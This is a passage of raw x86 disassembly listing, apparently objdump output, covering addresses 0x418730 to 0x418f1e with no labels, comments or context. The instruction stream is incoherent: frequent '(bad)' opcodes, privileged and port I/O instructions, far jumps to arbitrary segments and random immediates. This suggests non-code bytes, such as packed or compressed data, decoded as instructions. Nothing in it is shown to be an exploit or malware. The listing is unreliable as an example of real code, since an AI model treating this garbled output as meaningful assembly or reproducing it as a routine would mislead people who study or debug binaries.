  418730:	iret   
  418731:	push   ds
  418732:	outs   dx,BYTE PTR ds:[esi]
  418733:	cdq    
  418734:	mov    esp,0x8a88
  418739:	(bad)  
  41873a:	shl    DWORD PTR [ebx-0x617d9cd1],0x2d
  418741:	cdq    
  418742:	push   ds
  418743:	ins    DWORD PTR es:[edi],dx
  418744:	cmp    al,0xfc
  418746:	gs into 
  418748:	outs   dx,DWORD PTR ds:[esi]
  418749:	and    eax,0xdadd07c2
  41874e:	mov    ch,0xe6
  418750:	push   eax
  418751:	and    DWORD PTR [esi+0x8c0],esi
  418757:	push   edx
  418758:	rep lods al,BYTE PTR ds:[esi]
  41875a:	jb     0x418708
  41875c:	mov    edi,0x1a8dab79
  418761:	xlat   BYTE PTR ds:[ebx]
  418762:	(bad)  
  418763:	pop    ss
  418764:	in     al,dx
  418765:	lahf   
  418766:	pop    ebp
  418767:	icebp  
  418768:	ficomp WORD PTR [esi]
  41876a:	xor    BYTE PTR [ecx-0x35],bh
  41876d:	loopne 0x418776
  41876f:	cdq    
  418770:	jle    0x418736
  418772:	cdq    
  418773:	add    BYTE PTR [eax],al
  418775:	push   0x3f
  418777:	into   
  418778:	lea    esp,[esi+0x828425]
  41877e:	add    ah,dh
  418780:	call   0xa4c25134
  418785:	add    BYTE PTR [eax],al
  418787:	inc    ebp
  418788:	mov    dh,0xae
  41878a:	mov    ebp,0xf36f023d
  41878f:	or     bl,BYTE PTR [ebx]
  418791:	hlt    
  418792:	dec    edi
  418793:	xchg   ebx,eax
  418794:	imul   edi,DWORD PTR [esi],0xe471cf71
  41879a:	scas   eax,DWORD PTR es:[edi]
  41879b:	jnp    0x418789
  41879d:	outs   dx,DWORD PTR ds:[esi]
  41879e:	or     BYTE PTR [ebx+0x0],cl
  4187a1:	add    BYTE PTR [edx+eax*2-0x2],bl
  4187a5:	lea    edi,[esi+0x63dae6d1]
  4187ab:	mov    ah,0x37
  4187ad:	mov    eax,0xd9ed63e3
  4187b2:	xor    BYTE PTR [edx-0x2638e74e],bh
  4187b8:	into   
  4187b9:	dec    ecx
  4187ba:	sti    
  4187bb:	imul   ebp,eax,0x49aaef6c
  4187c1:	retf   0x7a24
  4187c4:	push   ss
  4187c5:	mov    ah,0x7a
  4187c7:	mov    cl,0x76
  4187c9:	(bad)
  4187cc:	fmul   QWORD PTR [eax-0x2affff09]
  4187d2:	or     ah,BYTE PTR [ecx+eiz*1-0x40a8fe44]
  4187d9:	mov    dh,0x1a
  4187db:	mov    esi,0x22c86b
  4187e0:	add    BYTE PTR [edi+edi*2],bh
  4187e3:	xlat   BYTE PTR ds:[ebx]
  4187e4:	sbb    DWORD PTR [ebp-0x3096a94e],ebp
  4187ea:	pushfw 
  4187ec:	push   edi
  4187ed:	rcr    BYTE PTR [ebp+0x0],0x0
  4187f1:	arpl   WORD PTR [edx-0x14461b2b],sp
  4187f7:	loopne 0x4187e6
  4187f9:	xor    al,0x64
  4187fb:	xor    al,BYTE PTR [edx+0xda0468]
  418801:	add    BYTE PTR [ecx-0x39],al
  418804:	push   ebx
  418805:	fst    DWORD PTR [ebp-0x4c]
  418808:	lods   al,BYTE PTR ds:[esi]
  418809:	dec    edi
  41880a:	push   ebp
  41880b:	adc    ecx,DWORD PTR [esi-0x427b8da]
  418811:	xchg   ebx,eax
  418812:	pushf  
  418813:	jnp    0x418823
  418815:	aam    0x8e
  418817:	pop    esp
  418818:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418819:	not    DWORD PTR [esp+edi*8]
  41881c:	sub    al,0xdb
  41881e:	das    
  41881f:	mov    ?,WORD PTR [ebx]
  418821:	js     0x4187ae
  418823:	div    DWORD PTR [ecx+0x18754e56]
  418829:	jmp    0xafbe:0x762867a
  418830:	mov    dh,0xf1
  418832:	aam    0x93
  418834:	dec    esi
  418835:	cli    
  418836:	jns    0x418811
  418838:	and    eax,0xa70f4343
  41883d:	fiadd  DWORD PTR ds:0x1749c51f
  418843:	xchg   edx,eax
  418844:	mov    eax,0x9d391e8a
  418849:	call   0xe680:0x92ea11de
  418850:	add    BYTE PTR [eax],al
  418852:	std    
  418853:	clc    
  418854:	or     BYTE PTR [edi],bh
  418856:	add    BYTE PTR [eax],al
  418858:	and    esp,DWORD PTR [edi+0x6cc720ee]
  41885e:	push   ds
  41885f:	pop    ecx
  418860:	jno    0x41888d
  418862:	lods   eax,DWORD PTR ds:[esi]
  418863:	imul   edi,edi,0x92fa5006
  418869:	adc    ch,BYTE PTR [eax+0x4a]
  41886c:	nop
  41886d:	cmp    edi,DWORD PTR ds:0x7425a5c7
  418873:	or     ebx,DWORD PTR [ebx+0x62]
  418876:	test   BYTE PTR [ebx+0x0],al
  418879:	add    dl,bh
  41887b:	cld    
  41887c:	jl     0x4188f2
  41887e:	or     bl,bl
  418880:	add    BYTE PTR [eax],al
  418882:	rcl    ah,0x0
  418885:	add    BYTE PTR [edx-0x48],dl
  418888:	stos   DWORD PTR es:[edi],eax
  418889:	pop    ebp
  41888a:	xchg   ecx,eax
  41888b:	mov    bp,0x29a9
  41888f:	in     al,dx
  418890:	pop    ecx
  418891:	mov    esi,0x50e7b232
  418896:	cmp    BYTE PTR [eax],dl
  418898:	test   ebp,esi
  41889a:	mov    dh,bh
  41889c:	daa    
  41889d:	mov    ecx,0x70045
  4188a2:	add    BYTE PTR ds:0x497897ab,dh
  4188a8:	add    al,BYTE PTR [esp+edi*4+0x0]
  4188ac:	add    BYTE PTR [edi+edx*1-0x3f8122ee],bl
  4188b3:	adc    eax,DWORD PTR [eax]
  4188b5:	add    BYTE PTR [ebp+eiz*4+0x7c3af817],ah
  4188bc:	jmp    0x371f:0x19917c0f
  4188c3:	aas    
  4188c4:	stc    
  4188c5:	mov    bh,0x24
  4188c7:	fsubp  st(1),st
  4188c9:	mov    ah,BYTE PTR [eax+0x342064ab]
  4188cf:	adc    esi,DWORD PTR [ecx+0x8a5a662]
  4188d5:	call   0x1f2a:0xdc470000
  4188dc:	in     eax,0x70
  4188de:	lods   eax,DWORD PTR cs:[esi]
  4188e0:	sub    bl,BYTE PTR [ebx+0x2c]
  4188e3:	mov    BYTE PTR [eax+0x0],dh
  4188e6:	add    BYTE PTR [edx-0x629b9285],ch
  4188ec:	cs push 0xba80
  4188f2:	xor    DWORD PTR [ecx],0xef2180e
  4188f8:	sub    edx,DWORD PTR [ebp-0x13fce2e7]
  4188fe:	cmp    eax,ebx
  418900:	xchg   ebx,eax
  418901:	pop    edx
  418902:	ffreep st(0)
  418904:	adc    DWORD PTR [eax],eax
  418906:	add    bl,bh
  418908:	(bad)  
  41890a:	add    edi,0xd60896c1
  418910:	add    BYTE PTR [eax],al
  418912:	push   ebx
  418913:	dec    edx
  418914:	fcmovnu st,st(7)
  418916:	jecxz  0x4188ff
  418918:	mov    ch,0x43
  41891a:	outs   dx,DWORD PTR ds:[esi]
  41891b:	xor    eax,0x62fcbd2e
  418920:	xor    al,0x75
  418922:	dec    edi
  418923:	rdtsc  
  418925:	cs or  al,0x89
  418928:	add    BYTE PTR [eax],al
  41892a:	mov    bl,0x81
  41892c:	sub    ah,BYTE PTR [ecx+0x2bd9e0b8]
  418932:	ret    0x2da0
  418935:	mov    ebx,0x799de852
  41893a:	pop    edi
  41893b:	adc    DWORD PTR [esi+0x5dcb9e77],ebx
  418941:	in     eax,0x8f
  418943:	rcr    DWORD PTR [edx-0x3fb3c7f1],cl
  418949:	add    BYTE PTR [eax],al
  41894b:	aaa    
  41894c:	push   ds
  41894d:	das    
  41894e:	inc    esp
  41894f:	xchg   ebp,eax
  418950:	add    BYTE PTR [eax],al
  418952:	jo     0x41896f
  418954:	aas    
  418955:	push   0xfffffff3
  418957:	mov    bl,0xbb
  418959:	(bad)  
  41895a:	xchg   ebp,eax
  41895b:	inc    ebx
  41895c:	stos   BYTE PTR es:[edi],al
  41895d:	jmp    0x8bc5ff81
  418962:	add    BYTE PTR [eax],al
  418964:	push   edi
  418965:	add    DWORD PTR [ebx],0xbb45794
  41896b:	daa    
  41896c:	inc    esi
  41896d:	cmp    BYTE PTR ds:0x874a201b,dh
  418973:	add    al,0x5
  418975:	add    BYTE PTR [eax],al
  418977:	jae    0x418928
  418979:	jle    0x41895a
  41897b:	dec    DWORD PTR [esi]
  41897d:	pop    ds
  41897e:	sub    bl,bh
  418980:	loopne 0x4189ea
  418982:	and    BYTE PTR [ebp-0x184d06a6],bl
  418988:	(bad)  
  418989:	popf   
  41898a:	rol    BYTE PTR [ecx-0x5a2b1f9d],1
  418990:	mov    dl,0xd2
  418992:	jge    0x41899b
  418994:	outs   dx,DWORD PTR ds:[esi]
  418995:	jmp    0x3b9e:0x43d9dfa3
  41899c:	push   ebp
  41899d:	nop
  41899e:	dec    ebx
  41899f:	test   al,0xea
  4189a1:	jecxz  0x418954
  4189a3:	enter  0x14,0x0
  4189a7:	sti    
  4189a8:	mov    edx,0x4640993d
  4189ad:	add    BYTE PTR [eax],al
  4189af:	sub    al,0x6c
  4189b1:	inc    ebx
  4189b2:	add    dh,dh
  4189b4:	add    BYTE PTR [eax],al
  4189b6:	inc    ebp
  4189b7:	jmp    0x1f6d:0x44c
  4189be:	mov    eax,0xbbc5505b
  4189c3:	scas   al,BYTE PTR es:[edi]
  4189c4:	jp     0x4189f1
  4189c6:	rol    BYTE PTR [ebp+0x0],0x0
  4189ca:	test   al,0x34
  4189cc:	push   esp
  4189cd:	or     BYTE PTR [edi],0x49
  4189d0:	sbb    bl,BYTE PTR [esi+eax*1]
  4189d3:	pop    es
  4189d4:	or     al,0x94
  4189d6:	add    BYTE PTR [eax],al
  4189d8:	sbb    bl,cl
  4189da:	mov    esp,esi
  4189dc:	pop    ebx
  4189dd:	loope  0x418a56
  4189df:	aad    0x5e
  4189e1:	jmp    0x4189c4
  4189e3:	inc    ecx
  4189e4:	mov    bl,0x55
  4189e6:	call   0xfe24b1e8
  4189eb:	jb     0x418a57
  4189ed:	cmp    al,BYTE PTR [ebx]
  4189ef:	out    0x2f,al
  4189f1:	dec    esi
  4189f2:	shl    ch,cl
  4189f4:	aam    0xed
  4189f6:	in     al,0x87
  4189f8:	cld    
  4189f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189fa:	sub    esp,DWORD PTR [ebx+esi*4]
  4189fd:	sub    al,0xea
  4189ff:	retf   
  418a00:	mov    DWORD PTR [ebp-0x631de30],ebx
  418a06:	js     0x418a6d
  418a08:	mov    ds:0xef7b9d9a,eax
  418a0d:	loop   0x418a69
  418a0f:	lock mov ch,0xb4
  418a12:	cmp    eax,0xb28c
  418a17:	push   es
  418a18:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a1a:	outs   dx,BYTE PTR ds:[esi]
  418a1b:	push   ss
  418a1c:	xchg   esp,eax
  418a1d:	cmp    eax,0xd3a75b89
  418a22:	popa   
  418a23:	push   ds
  418a24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a26:	data16 out 0x45,al
  418a29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a2a:	fabs   
  418a2c:	test   eax,0xf38a9fa0
  418a31:	test   al,0x9a
  418a33:	sbb    dl,BYTE PTR [ebx+0x4e2f5d58]
  418a39:	sub    eax,0x16a66dbc
  418a3f:	and    DWORD PTR [eax+0x2a000024],ecx
  418a45:	stc    
  418a46:	ins    DWORD PTR es:[edi],dx
  418a47:	inc    ebp
  418a48:	in     al,dx
  418a49:	lea    ebp,ds:[eax-0x773eca08]
  418a50:	loopne 0x418a52
  418a52:	add    BYTE PTR [eax-0x15f754f3],bl
  418a58:	add    BYTE PTR [eax],al
  418a5a:	xor    ch,ch
  418a5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a5d:	adc    edi,0xf04
  418a63:	jnp    0x4189e9
  418a65:	mov    DWORD PTR [eax],0xfedd4600
  418a6b:	pop    edx
  418a6c:	outs   dx,DWORD PTR ds:[esi]
  418a6d:	lds    edi,FWORD PTR [ecx]
  418a6f:	mov    edi,0x6e00
  418a74:	or     al,0x18
  418a76:	add    BYTE PTR [eax],al
  418a78:	(bad)  
  418a79:	mov    edi,DWORD PTR [edi]
  418a7b:	sbb    dl,BYTE PTR [edi]
  418a7d:	mov    ds:0xf7342a4b,al
  418a82:	mov    edi,0x8720fd2d
  418a87:	pop    eax
  418a88:	jecxz  0x418ac6
  418a8a:	jns    0x418a2e
  418a8c:	dec    esp
  418a8d:	scas   al,BYTE PTR es:[edi]
  418a8e:	add    BYTE PTR [eax],al
  418a90:	inc    edi
  418a91:	dec    eax
  418a92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a93:	add    BYTE PTR [eax],al
  418a95:	cwde   
  418a96:	adc    edi,DWORD PTR [ecx+0x39]
  418a99:	jae    0x418a37
  418a9b:	fwait
  418a9c:	jae    0x418ac3
  418a9e:	mov    eax,0xb080
  418aa3:	mov    al,0x25
  418aa5:	cmp    ah,BYTE PTR [ebx]
  418aa7:	and    ebx,eax
  418aa9:	jp     0x418ade
  418aab:	and    ch,BYTE PTR ds:0x83bdcfb2
  418ab1:	adc    esi,ebp
  418ab3:	cs inc esp
  418ab5:	inc    DWORD PTR [eax]
  418ab7:	add    dl,bl
  418ab9:	ret    
  418aba:	dec    ecx
  418abb:	fwait
  418abc:	jg     0x418ad3
  418abe:	and    BYTE PTR [eax+0x0],0x0
  418ac2:	jmp    0xe411:0xb38a0a8
  418ac9:	imul   ebp,DWORD PTR [ebp+0x23],0xffffff8c
  418acd:	xchg   esi,eax
  418ace:	add    BYTE PTR [eax],al
  418ad0:	mov    ds:0x7817ba38,al
  418ad5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ad6:	rol    ebp,1
  418ad8:	je     0x418a90
  418ada:	nop
  418adb:	retf   
  418adc:	mov    eax,ds:0x3c55a7f3
  418ae1:	nop
  418ae2:	xchg   edx,eax
  418ae3:	ror    DWORD PTR [ebx-0x1eec8975],1
  418ae9:	inc    edi
  418aea:	rcr    DWORD PTR [ebp+0x1d8811],1
  418af0:	add    BYTE PTR [edi+0x55540a69],ah
  418af6:	lahf   
  418af7:	popa   
  418af8:	push   edx
  418af9:	cmp    al,0x53
  418afb:	sbb    al,0xaa
  418afd:	add    eax,0x7d0457
  418b02:	add    cl,bl
  418b04:	lds    edx,FWORD PTR [edx-0x710c50fa]
  418b0a:	ficom  DWORD PTR [esp+edi*1+0x45b5f8f3]
  418b11:	scas   eax,DWORD PTR es:[edi]
  418b12:	dec    edx
  418b13:	in     al,0x70
  418b15:	not    ebp
  418b17:	cmp    eax,0x40c899
  418b1c:	add    bh,al
  418b1e:	xchg   ecx,eax
  418b1f:	cli    
  418b20:	inc    ebp
  418b21:	pop    edi
  418b22:	mov    WORD PTR [ecx+0x9320000],ds
  418b28:	mov    WORD PTR [eax+eax*1+0x355a1200],ds
  418b2f:	pop    ebp
  418b30:	or     esp,edi
  418b32:	shr    BYTE PTR [ecx],cl
  418b34:	xchg   ebp,eax
  418b35:	push   esp
  418b36:	fstp   TBYTE PTR [ebx+0x21]
  418b39:	cs push ds
  418b3b:	mov    DWORD PTR [ebp+0x36],edx
  418b3e:	push   cs
  418b3f:	push   ss
  418b40:	jle    0x418b16
  418b42:	pop    ds
  418b43:	aas    
  418b44:	mov    bl,0x87
  418b46:	and    BYTE PTR [esi+eiz*4],0x3e
  418b4a:	dec    DWORD PTR ds:0x944ad4f3
  418b50:	dec    ecx
  418b51:	mov    al,0x10
  418b53:	xchg   DWORD PTR [ecx-0x4af6e88c],edi
  418b59:	test   al,0x7d
  418b5b:	stos   BYTE PTR es:[edi],al
  418b5c:	mov    esp,0x546f43aa
  418b61:	enter  0x9a,0x0
  418b65:	xchg   esp,eax
  418b66:	sbb    eax,0x2e56ad8d
  418b6b:	ret    
  418b6c:	aas    
  418b6d:	dec    esi
  418b6e:	(bad)  
  418b6f:	lea    edi,[ebx]
  418b71:	cmp    eax,0x202b2f59
  418b76:	add    DWORD PTR [ecx-0x52],ebp
  418b79:	jb     0x418be7
  418b7b:	inc    edi
  418b7c:	xchg   esp,eax
  418b7d:	not    DWORD PTR [ebp-0x39]
  418b80:	add    al,bl
  418b82:	cwde   
  418b83:	cmp    DWORD PTR [edi],0x0
  418b86:	sldt   WORD PTR [eax]
  418b89:	stos   BYTE PTR es:[edi],al
  418b8a:	pop    esi
  418b8b:	and    dl,BYTE PTR [ebp-0x2c6c0851]
  418b91:	inc    ebx
  418b92:	mov    ds:0xd3d2c51d,al
  418b97:	dec    edx
  418b98:	cmp    cl,ch
  418b9a:	mov    eax,0xa896153e
  418b9f:	adc    dl,0x57
  418ba2:	or     dl,BYTE PTR [eax+eiz*2-0x77c12f13]
  418ba9:	daa    
  418baa:	add    BYTE PTR [eax],al
  418bac:	rcl    DWORD PTR [edx-0x26e404f6],1
  418bb2:	pop    edi
  418bb3:	adc    al,0x7f
  418bb5:	or     eax,0xef62f493
  418bba:	add    BYTE PTR [esi+0x0],bh
  418bbd:	add    BYTE PTR [ebx],ah
  418bbf:	jno    0x418c3a
  418bc1:	fadd   QWORD PTR [ebp-0x4e]
  418bc4:	mov    ah,0x5c
  418bc6:	and    edi,DWORD PTR [edx]
  418bc8:	jecxz  0x418c14
  418bca:	add    ah,dh
  418bcc:	add    BYTE PTR [eax],al
  418bce:	or     DWORD PTR [edi-0x62],ebp
  418bd1:	xor    eax,DWORD PTR [ecx-0x31]
  418bd4:	test   ecx,0x611305cf
  418bda:	adc    DWORD PTR [esi],0x68
  418bdd:	mov    edi,0x310bb27c
  418be2:	mov    ah,ch
  418be4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418be5:	add    bh,BYTE PTR [edi]
  418be7:	jbe    0x418b95
  418be9:	add    DWORD PTR [edi-0x6d1a2201],0x2bc99f68
  418bf3:	(bad)  
  418bf4:	(bad)  
  418bf6:	mov    edi,0xcf8c0f4d
  418bfb:	add    BYTE PTR [eax],al
  418bfd:	mov    al,0x6f
  418bff:	fisttp DWORD PTR [esi-0x71690ebf]
  418c05:	iret   
  418c06:	add    bl,BYTE PTR [eax+0x16]
  418c09:	mov    esp,0xbd8c
  418c0e:	out    0xbd,eax
  418c10:	pop    ds
  418c11:	arpl   WORD PTR [ecx],bx
  418c13:	leave  
  418c14:	jbe    0x418bda
  418c16:	mov    esi,0x67400000
  418c1b:	add    BYTE PTR [eax],al
  418c1d:	gs and ch,ch
  418c20:	push   edx
  418c21:	xchg   ebx,eax
  418c22:	aas    
  418c23:	xor    eax,0xf73aaf94
  418c28:	push   ebx
  418c29:	adc    al,0x84
  418c2b:	mov    ds:0x78f70000,al
  418c30:	mov    bl,0x3b
  418c32:	inc    ebp
  418c33:	fldenv [edx+0x51]
  418c36:	lock lea ecx,[edi+eiz*4+0x29860000]
  418c3e:	dec    ebp
  418c3f:	inc    edi
  418c40:	out    0xab,eax
  418c42:	(bad)  
  418c46:	add    BYTE PTR [ebp-0x46],ch
  418c49:	scas   al,BYTE PTR es:[edi]
  418c4a:	fstp   QWORD PTR [eax-0x4f]
  418c4d:	dec    ebx
  418c4e:	jge    0x418c02
  418c50:	(bad)  
  418c53:	hlt    
  418c54:	push   esi
  418c55:	sbb    al,0xc
  418c57:	add    DWORD PTR [eax],eax
  418c59:	add    ch,ch
  418c5b:	mov    DWORD PTR [eax-0x68ffff1d],0xd626edb2
  418c65:	mov    dh,0xee
  418c67:	ja     0x418cbe
  418c69:	adc    al,0x96
  418c6b:	sub    eax,0x940c5
  418c70:	add    dh,cl
  418c72:	das    
  418c73:	gs imul esp,DWORD PTR ds:[edx+0x553afecd],0xf7f7a019
  418c7f:	inc    esi
  418c80:	repnz ins DWORD PTR es:[edi],dx
  418c82:	dec    esi
  418c83:	mov    ebx,0xc5f93576
  418c88:	leave  
  418c89:	sbb    DWORD PTR [edi+0x47],esi
  418c8c:	sub    BYTE PTR ds:0xbf618eb8,bh
  418c92:	shl    DWORD PTR [ebx],0xc7
  418c95:	jmp    0x7f69449
  418c9a:	loopne 0x418cbc
  418c9c:	mov    al,ds:0xc40539f1
  418ca1:	mov    ch,0x0
  418ca3:	add    BYTE PTR [ebp+0x258ef1dc],al
  418ca9:	(bad)  
  418caa:	fucompp 
  418cac:	inc    esi
  418cad:	addr16 std 
  418caf:	not    DWORD PTR ds:0x24c826
  418cb5:	add    BYTE PTR [ecx],cl
  418cb7:	test   al,0x54
  418cb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418cba:	retf   0x9f34
  418cbd:	add    al,BYTE PTR [eax]
  418cbf:	test   DWORD PTR [eax],eax
  418cc1:	add    ch,cl
  418cc3:	call   0x6abbabf7
  418cc8:	or     eax,0x2b6ee76c
  418ccd:	lods   al,BYTE PTR ds:[esi]
  418cce:	in     al,dx
  418ccf:	xlat   BYTE PTR ds:[ebx]
  418cd0:	xor    esp,DWORD PTR [ecx]
  418cd2:	test   BYTE PTR [eax+eax*1],dh
  418cd5:	add    BYTE PTR [edi+eax*2+0x0],cl
  418cd9:	add    BYTE PTR [esi],al
  418cdb:	dec    esi
  418cdc:	xchg   ebx,eax
  418cdd:	fld    QWORD PTR [edi-0x11]
  418ce0:	push   esp
  418ce1:	and    eax,0xcf52de6
  418ce6:	cld    
  418ce7:	add    BYTE PTR [eax],al
  418ce9:	sub    esp,DWORD PTR [esi+0xac08f2]
  418cef:	add    cl,cl
  418cf1:	nop
  418cf2:	inc    esp
  418cf3:	add    BYTE PTR es:[eax],al
  418cf6:	mov    bl,0x2e
  418cf8:	push   0x58185fae
  418cfd:	inc    eax
  418cfe:	and    al,0x0
  418d00:	add    BYTE PTR [esi-0x51],ch
  418d03:	mov    dh,0xa1
  418d05:	xor    eax,0x23cc2390
  418d0a:	add    BYTE PTR [eax],al
  418d0c:	xor    ebx,DWORD PTR [eax+0x5f932a95]
  418d12:	inc    esp
  418d13:	mov    DWORD PTR [eax],eax
  418d15:	add    al,dh
  418d17:	(bad)  
  418d18:	jmp    0x20db:0x3b993889
  418d1f:	sub    edx,edx
  418d21:	jno    0x418d60
  418d23:	cmp    al,0xb8
  418d25:	dec    ecx
  418d26:	mov    edx,0xc266e2b1
  418d2b:	sbb    DWORD PTR [ebp-0x11],esi
  418d2e:	add    BYTE PTR [edx+0x0],ah
  418d31:	add    BYTE PTR [eax-0x4b],ch
  418d34:	out    0x99,eax
  418d36:	aas    
  418d37:	pop    eax
  418d38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d39:	mov    cl,0x8b
  418d3b:	retf   
  418d3c:	sub    ah,al
  418d3e:	repz ja 0x418d30
  418d41:	or     al,0xd5
  418d43:	add    BYTE PTR [eax],al
  418d45:	leave  
  418d46:	sar    BYTE PTR [ebx],1
  418d48:	cmp    DWORD PTR ds:0xee9e58cf,edx
  418d4e:	pop    esi
  418d4f:	ss add eax,eax
  418d52:	xchg   edx,eax
  418d53:	add    BYTE PTR [eax],al
  418d55:	jle    0x418d62
  418d57:	mov    ecx,0xc251af4f
  418d5c:	out    0x8,al
  418d5e:	jp     0x418d60
  418d60:	add    BYTE PTR [ebx+0x25e89a64],al
  418d66:	enter  0xf1,0x0
  418d6a:	lods   al,BYTE PTR ds:[esi]
  418d6b:	sub    eax,0x3284
  418d70:	fmul   DWORD PTR [ebp+0x2f]
  418d73:	popa   
  418d74:	sbb    bl,BYTE PTR [ebp-0x6baafcfa]
  418d7a:	(bad)  
  418d7b:	xor    al,0x7c
  418d7d:	and    al,0xc5
  418d7f:	push   ecx
  418d80:	jae    0x418d8a
  418d82:	retf   
  418d83:	add    BYTE PTR [eax],al
  418d85:	mov    DWORD PTR [eax+0x61],ecx
  418d88:	add    BYTE PTR [eax],al
  418d8a:	cmp    BYTE PTR [eax+0x3930000],0xbe
  418d91:	jne    0x418d9b
  418d93:	pusha  
  418d94:	add    BYTE PTR [eax],al
  418d96:	and    BYTE PTR [edi],bh
  418d98:	repz int3 
  418d9a:	inc    esp
  418d9b:	add    BYTE PTR [eax],al
  418d9d:	mov    ebx,0xcdfcbbac
  418da2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418da3:	xchg   ebp,eax
  418da4:	jmp    0x1621:0xe3b6aa8f
  418dab:	push   edi
  418dac:	mov    ah,0xca
  418dae:	xor    bh,dh
  418db0:	adc    ah,BYTE PTR [edx]
  418db2:	mov    BYTE PTR [eax+eax*1+0x0],al
  418db6:	xor    DWORD PTR [esi],esi
  418db8:	xchg   DWORD PTR [esi-0x5d126fbb],ebp
  418dbe:	(bad)  
  418dc0:	or     ecx,DWORD PTR [eax]
  418dc2:	cld    
  418dc3:	add    BYTE PTR [eax],al
  418dc5:	or     eax,0xa4899
  418dca:	add    bh,dl
  418dcc:	call   0xe516:0x164c
  418dd3:	mov    edx,0xd2a5f8cf
  418dd8:	stc    
  418dd9:	jg     0x418dbf
  418ddb:	pop    edi
  418ddc:	retf   0xf9
  418ddf:	add    BYTE PTR es:[eax],al
  418de2:	mov    WORD PTR [edx],?
  418de4:	add    BYTE PTR [eax],al
  418de6:	test   al,0x24
  418de8:	in     eax,0x84
  418dea:	jecxz  0x418dec
  418dec:	add    ah,dl
  418dee:	xchg   BYTE PTR [edx+eax*4-0x1a3f0ca7],ah
  418df5:	add    BYTE PTR [eax],al
  418df7:	fdivr  QWORD PTR [ebp-0x7a]
  418dfa:	data16 cld 
  418dfc:	sub    edx,DWORD PTR [eax]
  418dfe:	int3   
  418dff:	and    al,0x0
  418e01:	add    BYTE PTR [ebp+0x4d],dh
  418e04:	add    DWORD PTR [ebx+0x1],0xffffff9c
  418e08:	daa    
  418e09:	xchg   edi,eax
  418e0a:	adc    al,0xd6
  418e0c:	stc    
  418e0d:	lods   eax,DWORD PTR ds:[esi]
  418e0e:	call   0xb:0xcd1dea5
  418e15:	add    BYTE PTR [ebx+0x27b8eb13],bh
  418e1b:	cmp    ebp,DWORD PTR [eax+esi*1-0x57c56228]
  418e22:	fmul   DWORD PTR [ecx]
  418e24:	fsubr  st,st(0)
  418e26:	sub    DWORD PTR [ecx+0x3c5fadf1],0x19
  418e2d:	sti    
  418e2e:	adc    BYTE PTR ds:[ebx*2-0x19f40159],bl
  418e36:	mov    ecx,0x5b80ce34
  418e3b:	add    BYTE PTR [eax],al
  418e3d:	adc    DWORD PTR [ecx+edx*2],esi
  418e40:	xchg   DWORD PTR [edi+0x12886bb5],edi
  418e46:	add    BYTE PTR [eax],al
  418e48:	push   0xffffffff
  418e4a:	xchg   DWORD PTR [ebx-0x327c7a2d],esi
  418e50:	ret    
  418e51:	aas    
  418e52:	ja     0x418e76
  418e54:	dec    ecx
  418e55:	jge    0x418de3
  418e57:	rol    BYTE PTR [eax],cl
  418e59:	add    BYTE PTR [esi-0x775b794b],ch
  418e5f:	mov    edi,0xb8b00000
  418e64:	rol    cl,1
  418e66:	call   0xa0:0x84dfbf9f
  418e6d:	add    BYTE PTR [edx-0x2dad80a6],dl
  418e73:	call   0x460f6562
  418e78:	dec    eax
  418e79:	pop    ds
  418e7a:	add    BYTE PTR [eax],al
  418e7c:	and    BYTE PTR [ecx+ebx*8],dh
  418e7f:	sbb    BYTE PTR [edx],0x31
  418e82:	cmc    
  418e83:	cmp    eax,DWORD PTR [edx-0x283f6f77]
  418e89:	add    BYTE PTR [eax],al
  418e8b:	cld    
  418e8c:	(bad)  
  418e8d:	xor    bl,BYTE PTR [ebx+ebp*2+0x4ec21d4b]
  418e94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e95:	xor    eax,0x3d70df7b
  418e9a:	cmp    bh,BYTE PTR [ebx]
  418e9c:	repnz cmp dh,BYTE PTR [edi+0x67]
  418ea0:	lds    ecx,FWORD PTR [edx+0xf]
  418ea3:	and    ebp,DWORD PTR [eax]
  418ea5:	sbb    eax,0x3693cdab
  418eaa:	call   0xf800:0x98c82f
  418eb1:	sti    
  418eb2:	into   
  418eb3:	mov    BYTE PTR [ecx],0x42
  418eb6:	daa    
  418eb7:	jns    0x418e74
  418eb9:	sbb    al,0x91
  418ebb:	jbe    0x418e8e
  418ebd:	pop    eax
  418ebe:	fdiv   st(7),st
  418ec0:	(bad)  
  418ec1:	test   al,0x6f
  418ec3:	imul   edi,DWORD PTR [esi-0x505f8b2f],0xfbd0b2c9
  418ecd:	and    al,BYTE PTR [ecx+0x57]
  418ed0:	rol    BYTE PTR [ecx-0x689847a2],1
  418ed6:	xor    ebx,DWORD PTR [eax-0x67]
  418ed9:	pop    ss
  418eda:	adc    eax,ebp
  418edc:	sub    edi,DWORD PTR [edi+0x3764ff57]
  418ee2:	sub    BYTE PTR [edx+edi*4],dh
  418ee5:	pushf  
  418ee6:	xor    eax,0x2593b02c
  418eeb:	xchg   DWORD PTR [edi+esi*1],edi
  418eee:	(bad)  
  418eef:	in     al,0x95
  418ef1:	adc    bh,0x0
  418ef4:	add    ah,ch
  418ef6:	xor    eax,0x9861da12
  418efb:	add    esp,eax
  418efd:	popa   
  418efe:	add    BYTE PTR [eax],al
  418f00:	push   esi
  418f01:	leave  
  418f02:	mov    edi,es
  418f04:	add    BYTE PTR [eax],al
  418f06:	retf   0xea7f
  418f09:	imul   DWORD PTR [esi+eax*1]
  418f0c:	bound  ecx,QWORD PTR [ebx]
  418f0e:	icebp  
  418f0f:	or     al,0xc2
  418f11:	add    BYTE PTR [eax],al
  418f13:	rol    BYTE PTR [ebx],1
  418f15:	leave  
  418f16:	lods   eax,DWORD PTR ds:[esi]
  418f17:	or     al,0x9b
  418f19:	add    BYTE PTR [eax],al
  418f1b:	mov    ah,0x89
  418f1d:	push   eax
  418f1e:	fisub  WORD PTR [ecx+eax*8+0x4a]
